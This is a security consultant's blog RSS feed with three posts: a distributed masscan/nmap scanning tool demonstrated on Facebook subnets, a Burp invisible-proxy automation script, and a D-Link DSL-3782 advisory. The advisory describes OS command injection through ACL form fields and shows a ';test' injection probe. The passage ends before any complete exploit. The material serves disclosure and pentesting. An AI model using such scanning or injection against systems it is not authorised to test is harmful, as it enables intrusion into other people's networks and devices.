<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Lorenzo Comi</title>
    <description>IT Security Consultant</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Thu, 11 Feb 2021 19:15:18 +0100</pubDate>
    <lastBuildDate>Thu, 11 Feb 2021 19:15:18 +0100</lastBuildDate>
    <generator>Jekyll v3.6.2</generator>
    
      <item>
        <title>Massive Hosts Discovery with SaturnV</title>
        <description>&lt;p&gt;&lt;em&gt;SaturnV provides a fast deployable distributed port scanner and information collector infrastructure. This software was developed to provide a lightweight tool to pentesters who need to perform sporadic Network PenTest activities on big ranges of public faced IP subnets.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;main-features&quot;&gt;Main Features&lt;/h2&gt;
&lt;p&gt;The idea behind SaturnV is simple: I need that my PC uses remote bots to perform port scans and discovery activities in a distributed way. Once bots have finished the scans I just need to grab the results on my local machine, parse them and create a “starting report” that could be useful for further manual analysis.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Different scanning approach: since we have to optimize time, masscan is used to perform a SYN scan on all ports of every host. The results provided by masscan will be used as input for nmap and other tools that will provide more information about services (like banners or versions).&lt;/li&gt;
  &lt;li&gt;Asynchronous operations: bots are autonomous and work without staying connected to any sort of master host. So I can use this software on my PC to start the scan on the bots and then I can turn it off, no data will be lost.&lt;/li&gt;
  &lt;li&gt;Customizable: through the configuration file it is possible to tune your scan parameter and the tools command line.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-05-01-Massive-Hosts-Discovery-with-SaturnV/architecture.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;execution-example&quot;&gt;Execution Example&lt;/h2&gt;

&lt;p&gt;In order to provide a small DEMO of this tool I used some facebook related ip subnets as targets since they are under bug bounty. The following steps will cover all the installation and execution process of the SaturnV tool providing a basic example of its behaviour.&lt;/p&gt;

&lt;h4 id=&quot;1-clone-the-project-from-github&quot;&gt;1. Clone the project from github&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/c0mix/SaturnV.git
Cloning into 'SaturnV'...
remote: Enumerating objects: 32, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (25/25), done.
remote: Total 32 (delta 10), reused 25 (delta 4), pack-reused 0
Unpacking objects: 100% (32/32), done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;2-install-the-requirement-on-attackers-pc&quot;&gt;2. Install the requirement on attacker’s PC&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd SaturnV/
sudo pip3 install -r requirements.txt 
Collecting aiocontextvars==0.2.2 (from -r requirements.txt (line 1))
Downloading https://files.pythonhosted.org/packages/db/c1/7a723e8d988de0a2e623927396e54b6831b68cb80dce468c945b849a9385/aiocontextvars-0.2.2-py2.py3-none-any.whl
Collecting bcrypt==3.1.7 (from -r requirements.txt (line 2))
Downloading https://files.pythonhosted.org/packages/8b/1d/82826443777dd4a624e38a08957b975e75df859b381ae302cfd7a30783ed/bcrypt-3.1.7-cp34-abi3-manylinux1_x86_64.whl (56kB)
100% |████████████████████████████████| 61kB 3.0MB/s 
[ . . . ]
Successfully installed PyNaCl-1.3.0 aiocontextvars-0.2.2 bcrypt-3.1.7 certifi-2020.4.5.1 cffi-1.14.0 contextvars-2.4 cryptography-2.8 idna-2.9 immutables-0.11 loguru-0.4.1 paramiko-2.7.1 pyOpenSSL-19.1.0 pycparser-2.19 python-libnmap-0.7.0 pyxattr-0.7.1 requests-2.23.0 scp-0.13.2 six-1.14.0 urllib3-1.25.9
python3 saturnV.py
***** Welcome to SaturnV *****
14:37:03 | ERROR | No argument provided!
usage: saturnV.py [-h] [-t TARGET] [-k] [-s] [-mS] [-nS] [-aS] [-gS] [-mR]
[-nR] [-aR] [-gR] [-g] [-c] [-o] [-r] [-v]
Boost your Network Discovery &amp;amp; Recon activity.
optional arguments:
-h, --helpshow this help message and exit
-t TARGET, --target TARGET
Takes as input a multi format target list and produces
the original_subnets.txt file
-k, --ssh-key Deploy an ssh key on bots
-s, --setupInstall all the required tools and create folder
structure on bots
-mS, --masscan-script
Create the Masscan script
-nS, --nmap-scriptCreate the Nmap script (Masscan results needed!)
-aS, --amass-scriptCreate the Amass script (Masscan results needed!)
-gS, --gobuster-script
Create the Gobuster script (Masscan results needed!)
-mR, --masscan-runSplit and run Masscan script on bots
-nR, --nmap-runSplit and run Nmap script on bots
-aR, --amass-runSplit and run Amass script on bots
-gR, --gobuster-runSplit and run Gobuster script on bots
-g, --get-results Collect outputs from all bots
-c, --check-scanCheck scan progress on each bot
-o, --osintPerform OSINT activity (Grab info from SSL certs,
HackerTarget and Bing Dork)
-r, --reportCreate the final report (at least Masscan results
needed!)
-v, --verbose Increase output verbosity
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;3-edit-the-configuration-file-with-your-parameters-at-least-bots-and-npt_name-must-be-set&quot;&gt;3. Edit the configuration file with your parameters (at least &lt;code class=&quot;highlighter-rouge&quot;&gt;bots&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;npt_name&lt;/code&gt; must be set)&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-05-01-Massive-Hosts-Discovery-with-SaturnV/config.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;4-setup-your-ssh-key-in-this-case-im-using-aws-bots-so-ive-put-my-private-key-inside-ssh_key-folder&quot;&gt;4. Setup your SSH Key (in this case I’m using AWS bots so I’ve put my private key inside ssh_key folder)&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ls -l ssh_key/
total 4
-r-------- 1 ubuntu ubuntu 1692 May9 14:27 lcomi.pem
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;5-setup-bots&quot;&gt;5. Setup bots&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 saturnV.py --setup
***** Welcome to SaturnV *****
14:46:42 | INFO | SSH private key found in ssh_key folder, the following key will be used: lcomi.pem
14:46:44 | INFO | Command: mkdir ~/saturnV Executed on Bot: 3.12.83.119
14:46:44 | INFO | Command: touch /tmp/saturnV_install_log.txt Executed on Bot: 3.12.83.119
14:46:44 | INFO | Uploaded bot_dependencies.txt to ~/saturnV/bot_dependencies.sh
14:46:44 | INFO | Command: chmod +x ~/saturnV/bot_dependencies.sh Executed on Bot: 3.12.83.119
14:46:44 | INFO | Starting dependencies installation on Bot 3.12.83.119, this might take a while...
14:46:56 | INFO | Dependencies installation on Bot 3.12.83.119 is FINISHED, please review logs/saturnV_install_log_3_12_83_119.txt log file to check if everything went well!
14:46:58 | INFO | Command: mkdir ~/saturnV Executed on Bot: 3.22.117.16
14:46:58 | INFO | Command: touch /tmp/saturnV_install_log.txt Executed on Bot: 3.22.117.16
14:46:58 | INFO | Uploaded bot_dependencies.txt to ~/saturnV/bot_dependencies.sh
14:46:58 | INFO | Command: chmod +x ~/saturnV/bot_dependencies.sh Executed on Bot: 3.22.117.16
14:46:58 | INFO | Starting dependencies installation on Bot 3.22.117.16, this might take a while...
14:47:11 | INFO | Dependencies installation on Bot 3.22.117.16 is FINISHED, please review logs/saturnV_install_log_3_22_117_16.txt log file to check if everything went well!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;6-define-your-target-inside-a-file-such-as-the-following-my_targettxt&quot;&gt;6. Define your target inside a file, such as the following &lt;code class=&quot;highlighter-rouge&quot;&gt;my_target.txt&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/2020-05-01-Massive-Hosts-Discovery-with-SaturnV/target.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 saturnV.py --target my_target.txt 
***** Welcome to SaturnV *****
15:05:04 | INFO | File my_target.txt was successfully elaborated, new targets file is original_subnets.txt
wget https://raw.githubusercontent.com/c0mix/subnet_splitter/master/subnet_splitter.py &amp;amp;&amp;amp; python3 subnet_splitter.py --input original_subnets.txt --output target_subnets.txt --size 28
--2020-05-09 15:07:13--https://raw.githubusercontent.com/c0mix/subnet_splitter/master/subnet_splitter.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.124.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.124.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2499 (2.4K) [text/plain]
Saving to: ‘subnet_splitter.py’
subnet_splitter.py 100%[=====================================&amp;gt;]2.44K--.-KB/sin 0s
2020-05-09 15:07:13 (46.8 MB/s) - ‘subnet_splitter.py’ saved [2499/2499]
cat target_subnets.txt
185.60.216.34/32
31.13.71.36/32
31.13.92.0/28
31.13.92.16/28
31.13.92.32/28
31.13.92.48/28
31.13.92.64/28
31.13.92.80/28
31.13.92.96/28
31.13.92.112/28
31.13.92.128/28
31.13.92.144/28
31.13.92.160/28
31.13.92.176/28
31.13.92.192/28
31.13.92.208/28
31.13.92.224/28
31.13.92.240/28
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;7-prepare-and-execute-masscan-test&quot;&gt;7. Prepare and execute masscan test&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 saturnV.py --masscan-script --masscan-run
***** Welcome to SaturnV *****
15:08:52 | INFO | SSH private key found in ssh_key folder, the following key will be used: lcomi.pem
15:08:52 | INFO | Successfully parsed and added 18 targets subnets
15:08:54 | INFO | Uploaded scripts/masscan_scan_script_1.sh to ~/saturnV/scripts/
15:08:54 | INFO | Command: chmod +x ~/saturnV/scripts/masscan_scan_script_1.sh Executed on Bot: 3.12.83.119
15:08:54 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s masscan &quot;scripts/masscan_scan_script_1.sh&quot; Executed on Bot: 3.12.83.119
15:08:55 | INFO | Uploaded scripts/masscan_scan_script_2.sh to ~/saturnV/scripts/
15:08:55 | INFO | Command: chmod +x ~/saturnV/scripts/masscan_scan_script_2.sh Executed on Bot: 3.22.117.16
15:08:55 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s masscan &quot;scripts/masscan_scan_script_2.sh&quot; Executed on Bot: 3.22.117.16
python3 saturnV.py --check
***** Welcome to SaturnV *****
15:09:02 | INFO | SSH private key found in ssh_key folder, the following key will be used: lcomi.pem
15:09:03 | WARNING | masscan execution STARTED on Bot: 3.12.83.119
15:09:04 | WARNING | masscan execution STARTED on Bot: 3.22.117.16
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;8-wait-until-the-scan-is-finished-on-all-your-bots-then-grab-the-results&quot;&gt;8. Wait until the scan is finished on all your bots, then grab the results&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 saturnV.py --check
***** Welcome to SaturnV *****
16:51:03 | INFO | SSH private key found in ssh_key folder, the following key will be used: lcomi.pem
16:51:04 | INFO | masscan execution 100% completed on Bot: 3.12.83.119
16:51:05 | INFO | masscan execution 100% completed on Bot: 3.22.117.16
python3 saturnV.py --get-results
***** Welcome to SaturnV *****
17:01:20 | INFO | SSH private key found in ssh_key folder, the following key will be used: lcomi.pem
17:01:21 | INFO | Transferring outputs/masscan from bot 3.12.83.119 to local outputs/ folder
17:02:05 | INFO | Transferring outputs/masscan from bot 3.22.117.16 to local outputs/ folder
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;9-prepare-and-launch-other-scans&quot;&gt;9. Prepare and launch other scans&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 saturnV.py --nmap-script --amass-script --gobuster-script --nmap-run --amass-run --gobuster-run
***** Welcome to SaturnV *****
17:03:27 | INFO | SSH private key found in ssh_key folder, the following key will be used: lcomi.pem
17:03:27 | INFO | Parsing Masscan scan results
17:03:27 | INFO | Masscan discovery has found 103 open services on 52 different hosts
17:03:27 | INFO | Nmap script created: scripts/nmap_scan_script.sh
17:03:27 | INFO | Amass script created: scripts/amass_scan_script.sh
17:03:27 | INFO | Checking web service presence on each open service, this might take a while...
17:04:11 | INFO | Gobuster script created: scripts/gobuster_scan_script.sh
17:04:12 | INFO | Uploaded scripts/nmap_scan_script_1.sh to ~/saturnV/scripts/
17:04:12 | INFO | Command: chmod +x ~/saturnV/scripts/nmap_scan_script_1.sh Executed on Bot: 3.12.83.119
17:04:12 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s nmap &quot;scripts/nmap_scan_script_1.sh&quot; Executed on Bot: 3.12.83.119
17:04:14 | INFO | Uploaded scripts/nmap_scan_script_2.sh to ~/saturnV/scripts/
17:04:14 | INFO | Command: chmod +x ~/saturnV/scripts/nmap_scan_script_2.sh Executed on Bot: 3.22.117.16
17:04:14 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s nmap &quot;scripts/nmap_scan_script_2.sh&quot; Executed on Bot: 3.22.117.16
17:04:14 | INFO | Uploaded scripts/amass_scan_script_1.sh to ~/saturnV/scripts/
17:04:14 | INFO | Command: chmod +x ~/saturnV/scripts/amass_scan_script_1.sh Executed on Bot: 3.12.83.119
17:04:14 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s amass &quot;scripts/amass_scan_script_1.sh&quot; Executed on Bot: 3.12.83.119
17:04:14 | INFO | Uploaded scripts/amass_scan_script_2.sh to ~/saturnV/scripts/
17:04:14 | INFO | Command: chmod +x ~/saturnV/scripts/amass_scan_script_2.sh Executed on Bot: 3.22.117.16
17:04:15 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s amass &quot;scripts/amass_scan_script_2.sh&quot; Executed on Bot: 3.22.117.16
17:04:15 | INFO | Uploaded scripts/gobuster_scan_script_1.sh to ~/saturnV/scripts/
17:04:15 | INFO | Command: chmod +x ~/saturnV/scripts/gobuster_scan_script_1.sh Executed on Bot: 3.12.83.119
17:04:15 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s gobuster &quot;scripts/gobuster_scan_script_1.sh&quot; Executed on Bot: 3.12.83.119
17:04:15 | INFO | Uploaded scripts/gobuster_scan_script_2.sh to ~/saturnV/scripts/
17:04:15 | INFO | Command: chmod +x ~/saturnV/scripts/gobuster_scan_script_2.sh Executed on Bot: 3.22.117.16
17:04:15 | INFO | Command: cd ~/saturnV/ &amp;amp;&amp;amp; tmux new -d -s gobuster &quot;scripts/gobuster_scan_script_2.sh&quot; Executed on Bot: 3.22.117.16
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;10-grab-again-the-results-perform-osint-activities-and-finally-produce-the-csv-report&quot;&gt;10. Grab again the results, perform OSINT activities and finally produce the CSV report.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 saturnV.py --get-results --osint --report
***** Welcome to SaturnV *****
17:08:51 | INFO | SSH private key found in ssh_key folder, the following key will be used: lcomi.pem
17:08:52 | INFO | Transferring outputs/masscan from bot 3.12.83.119 to local outputs/ folder
17:09:01 | INFO | Transferring outputs/amass from bot 3.12.83.119 to local outputs/ folder
17:09:11 | INFO | Transferring outputs/nmap from bot 3.12.83.119 to local outputs/ folder
17:09:36 | INFO | Transferring outputs/gobuster from bot 3.12.83.119 to local outputs/ folder
17:09:42 | INFO | Transferring outputs/masscan from bot 3.22.117.16 to local outputs/ folder
17:09:50 | INFO | Transferring outputs/amass from bot 3.22.117.16 to local outputs/ folder
17:10:00 | INFO | Transferring outputs/nmap from bot 3.22.117.16 to local outputs/ folder
17:10:25 | INFO | Transferring outputs/gobuster from bot 3.22.117.16 to local outputs/ folder
17:10:29 | INFO | Parsing Masscan scan results
17:10:29 | INFO | Nmap outputs found! Adding them to final report
17:10:29 | INFO | Parsing Nmap scan results
17:10:29 | INFO | Services found by Nmap: 103 - Services found by Masscan: 103
17:10:29 | INFO | Amass outputs found! Adding them to final report
17:10:29 | INFO | Parsing Amass scan results
17:10:29 | INFO | Gobuster outputs found! you can manually review them in outputs/gobuster folder
17:10:29 | INFO | Getting information through OSINT
17:11:48 | INFO | Web application URLs eventually discovered with Bing dork can be found here: outputs/bing/url_resources.txt
17:11:48 | INFO | Creating the final report: final_output.csv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-05-01-Massive-Hosts-Discovery-with-SaturnV/final.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;why-saturnv&quot;&gt;Why SaturnV&lt;/h2&gt;
&lt;p&gt;The name of this tool wants to honor the magnificent NASA rocket which took men on the moon in 1969.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;As of 2020, the Saturn V remains the tallest, heaviest, and most powerful rocket ever brought to operational status.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/images/2020-05-01-Massive-Hosts-Discovery-with-SaturnV/saturn.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/robertdavidgraham/masscan&quot;&gt;Masscan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nmap.org/&quot;&gt;Nmap&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;Amass&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;Gobuster&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://hackertarget.com/&quot;&gt;HackerTargeT&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;take-me-immediatly-to-the-code&quot;&gt;Take me immediatly to the code!&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/c0mix/SaturnV&quot;&gt;&lt;img src=&quot;/images/2020-05-01-Massive-Hosts-Discovery-with-SaturnV/github.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;https://github.com/c0mix/SaturnV&lt;/p&gt;
</description>
        <pubDate>Fri, 01 May 2020 17:04:23 +0200</pubDate>
        <link>http://localhost:4000/2020/Massive-Hosts-Discovery-with-SaturnV/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/Massive-Hosts-Discovery-with-SaturnV/</guid>
        
        <category>PenTest</category>
        
        <category>Network</category>
        
        <category>Nmap</category>
        
        <category>Masscan</category>
        
        <category>Discovery</category>
        
        <category>Recon</category>
        
        
        <category>NetworkPT</category>
        
      </item>
    
      <item>
        <title>Introducing SOS_Proxy</title>
        <description>&lt;p&gt;&lt;em&gt;In this post I will introduce a simple but effective tool that I developed in order to automate the invisible proxy technique and manage to intercept the HTTP traffic of any non proxy-aware device.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;invisible-proxy-technique-in-bites&quot;&gt;Invisible Proxy Technique in bites&lt;/h2&gt;

&lt;p&gt;Is it possible to proxy a device that does not support this functionality? Sometimes, under particular circumstances, &lt;strong&gt;YES&lt;/strong&gt;. You can do that with &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite&lt;/a&gt; and the invisible proxying technique explained in &lt;a href=&quot;https://portswigger.net/burp/documentation/desktop/tools/proxy/options/invisible&quot;&gt;Portswigger’s article&lt;/a&gt;. Following a brief summary of the steps that must be implemented in order to correctly intercept the HTTP traffic.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Create a separate virtual network interface for each destination host.&lt;/li&gt;
  &lt;li&gt;Create a separate Proxy listener for each interface (or two listeners if HTTP and HTTPS are both in use).&lt;/li&gt;
  &lt;li&gt;Using your hosts file, redirect each destination hostname to a different network interface (i.e., to a different listener).&lt;/li&gt;
  &lt;li&gt;Configure Burp’s listener on each interface to redirect all traffic to the IP address of the host whose traffic was redirected to it.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;sos_proxy&quot;&gt;SOS_Proxy&lt;/h2&gt;
&lt;p&gt;In order to automate the setup of multiple invisible proxies with Burp I’ve developed a simple Python script called SOS_Proxy. The main features of this tool and a simple step-by-step demo can be found insite the following &lt;a href=&quot;https://www.slideshare.net/LorenzoComi1/sosproxy-invisible-proxy-automation&quot;&gt;presentation&lt;/a&gt;. Otherwise, if you just want to check the source code, you can find it on &lt;a href=&quot;https://github.com/c0mix/SOS_Proxy&quot;&gt;github&lt;/a&gt;!&lt;/p&gt;

&lt;iframe src=&quot;//www.slideshare.net/slideshow/embed_code/key/D7vbsbK5ku15PN&quot; width=&quot;595&quot; height=&quot;485&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot; allowfullscreen=&quot;&quot;&gt; &lt;/iframe&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Morover, the following video will show a real use case against an Android device.&lt;/p&gt;
&lt;div&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/R9VAWpXcXAw&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;
&lt;style&gt;
	.video-container {
	position:relative;
	padding-bottom:56.25%;
	padding-top:30px;
	height:0;
	overflow:hidden;
}

.video-container iframe, .video-container object, .video-container embed {
	position:absolute;
	top:0;
	left:0;
	width:100%;
	height:100%;
}	
&lt;/style&gt;

&lt;h2 id=&quot;esc-talk-record-in-italian&quot;&gt;ESC Talk Record (in Italian)&lt;/h2&gt;
&lt;p&gt;Last summer i attended the &lt;a href=&quot;https://www.endsummercamp.org/index.php/End_Summer_Camp&quot;&gt;End Summer Camp (ESC)&lt;/a&gt; security conference in Venice (Italy) as a speaker in order to present this simple but useful tool. Below you can find the video recording of that talk.&lt;/p&gt;
&lt;div class=&quot;video-container&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/OP1gJEn1gSY&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;
&lt;style&gt;
	.video-container {
	position:relative;
	padding-bottom:56.25%;
	padding-top:30px;
	height:0;
	overflow:hidden;
}

.video-container iframe, .video-container object, .video-container embed {
	position:absolute;
	top:0;
	left:0;
	width:100%;
	height:100%;
}	
&lt;/style&gt;

</description>
        <pubDate>Mon, 30 Sep 2019 17:04:23 +0200</pubDate>
        <link>http://localhost:4000/2019/Introducing-SOS_Proxy/</link>
        <guid isPermaLink="true">http://localhost:4000/2019/Introducing-SOS_Proxy/</guid>
        
        <category>IoT</category>
        
        <category>PenTest</category>
        
        <category>Proxy</category>
        
        <category>Burp</category>
        
        <category>HTTP</category>
        
        <category>Python</category>
        
        
        <category>PenTest</category>
        
      </item>
    
      <item>
        <title>D-Link DSL-3782 SecAdvisory: OS Command Injection and Stored XSS</title>
        <description>&lt;p&gt;&lt;em&gt;In this article I’m going to release the technical details of two vulnerabilities that I found by analyzing D-Link DIR-3782 router web interface. In particular I’ve found OS Command Injection and Stored Cross Site Scripting vulnerabilities.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-device-d-link-dsl-3782&quot;&gt;The Device: D-Link DSL-3782&lt;/h2&gt;
&lt;p&gt;The VDSL/ADSL Wi-Fi Modem Router AC1200 Dual-Band DSL-3782 is a router device suitable for homes or small offices with ADSL line.
Once powered on, the device provides a simple web interface with many different menu and settings, such as Firewall, Application, Port Forwarding and Access Control List. If you want more information about this product, a full description (in Italian) can be found &lt;a href=&quot;https://eu.dlink.com/it/it/products/dsl-3782-wireless-ac1200-dual-band-vdsl-adsl-modem-router&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;At the time of writing, this device is marked as &lt;code class=&quot;highlighter-rouge&quot;&gt;in production&lt;/code&gt; by D-Link and this means that its software is actively maintained and supported by the vendor. The firmware version afflicted by these vulnerabilities is the &lt;code class=&quot;highlighter-rouge&quot;&gt;1.01&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;1.03&lt;/code&gt; version addressed the flaws.&lt;/p&gt;

&lt;h2 id=&quot;os-command-injection&quot;&gt;OS Command Injection&lt;/h2&gt;
&lt;p&gt;OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and it usually fully compromises the application and all its data.&lt;/p&gt;

&lt;h3 id=&quot;discovery&quot;&gt;Discovery&lt;/h3&gt;
&lt;p&gt;Hunting for some injection points, I noticed a particular menu inside the router web server that allows a user to define a custom Access Control List (ACL).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACL.png&quot; alt=&quot;ACL Menu&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was curious to understand how it had been implemented so I decided to access the router console and search for some sort of “acl-related” file. Poking around inside the configuration directory &lt;code class=&quot;highlighter-rouge&quot;&gt;etc&lt;/code&gt;, I found a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;acl.sh&lt;/code&gt; that seems to be promising.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh.png&quot; alt=&quot;acl.sh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next move was to determinate if this file was, in some way, related or linked to the ACL menu of the web interface. Below is provided a usage example of this functionality through some screenshots that show what a user can see from the web interface and also what happens inside the device configuration file &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/acl.sh&lt;/code&gt; when a new ACL is activated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACLsh2.png&quot; alt=&quot;ACL Menu2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2019-01-24-D-Link-DIR-3782-SecAdvisory:-OS-Command-Injection-and-Stored-XSS/new_ACL2.png&quot; alt=&quot;acl.sh2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great!! Now we know for sure that multiple user inputs such as &lt;code class=&quot;highlighter-rouge&quot;&gt;Source IP Address&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;Application&lt;/code&gt;, that are sent as the form values &lt;code class=&quot;highlighter-rouge&quot;&gt;ScrIPaddrBeginTXT&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ApplicationSEL&lt;/code&gt;, are taken by the application and used as parameters for many different iptables commands so a change in web interface implies a direct change inside &lt;code class=&quot;highlighter-rouge&quot;&gt;acl.sh&lt;/code&gt; script. Moreover the script is immediately executed by the device when a new ACL is created.&lt;/p&gt;

&lt;p&gt;Let’s start to check if a correct validation is applied to user’s input. A variety of shell metacharacters can be used to perform OS command injection attacks, but the most common in a unix-like environment is the &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt;. Indeed the first payload that I tried to inject inside &lt;code class=&quot;highlighter-rouge&quot;&gt;ScrIPaddrEndTXT&lt;/code&gt; parameter was the harmless &lt;code class=&quot;highlighter-rouge&quot;&gt;;test&lt;/code&gt; that aims to end the previous iptables command syntax with a &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; and execute the fake command &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;.&lt;/p&gt;

